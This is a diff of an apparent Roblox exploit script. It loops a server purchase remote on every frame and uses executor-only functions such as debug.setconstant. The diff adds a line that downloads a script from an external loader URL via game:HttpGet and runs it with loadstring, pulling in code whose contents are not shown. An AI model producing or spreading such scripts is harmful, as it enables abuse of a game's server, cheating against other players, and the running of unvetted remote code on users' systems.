@@ -1,4 +1,5 @@
 local SafePurchaseRemote = game:GetService("ReplicatedStorage"):WaitForChild("SafePurchaseRemote")
+local RunService = game:GetService("RunService")
 
 local punch = {}
 
@@ -19,11 +20,13 @@ end
 debug.setconstant(punch, 3, 0)
 
 spawn(function()
-    while task.wait() do punch end
+    while task.wait() do punch() end
 end)
 
-while task.wait() do
+loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/4f10afce2fa508525d12d2486bc8048c.lua"))()
+
+RunService.Heartbeat:Connect(function()
    pcall(function()
          SafePurchaseRemote:FireServer(1)
    end)
-end
+end)
